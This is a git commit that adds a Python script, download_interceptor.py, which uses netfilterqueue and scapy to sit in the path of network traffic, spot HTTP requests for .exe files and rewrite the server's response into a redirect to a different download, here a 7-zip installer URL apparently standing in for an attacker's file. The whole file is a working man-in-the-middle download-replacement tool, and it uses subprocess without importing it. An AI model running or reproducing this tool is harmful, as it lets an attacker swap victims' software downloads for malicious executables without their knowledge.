96592f29a9c23f7980cdbd95a3724378c2150b3d
ku-dmitry <akinc@yandex.ru>
2022-02-15 18:28:17 +0300

    Add download_interceptor

---
+++ download_interceptor.py
@@ -0,0 +1,44 @@
+#!/usr/bin/env python
+import netfilterqueue
+import scapy.all as scapy
+
+
+ack_list = []
+
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+
+def process_packet(packet):
+    try:
+        scapy_packet = scapy.IP(packet.get_payload())
+        if scapy_packet.haslayer(scapy.Raw):
+            if scapy_packet[scapy.TCP].dport == 80:
+                if ".exe" in str(scapy_packet[scapy.Raw].load):
+                    print("[+] EXE Request")
+                    ack_list.append(scapy_packet[scapy.TCP].ack)
+            elif scapy_packet[scapy.TCP].sport == 80:
+                if scapy_packet[scapy.TCP].seq in ack_list:
+                    ack_list.remove(scapy_packet[scapy.TCP].seq)
+                    print("[+] Replacing File")
+                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.7-zip.org/a/7z2107-x64.exe\n")
+                    packet.set_payload(bytes(modified_packet))
+
+        packet.accept()
+    except IndexError:
+        print(' Skipping TCP Layer Error')
+
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
+
+except KeyboardInterrupt:
+    print("[-] Detected Ctrl + C........")
+    subprocess.call("iptables --flush", shell=True)
+    print("[-] Quitting............")
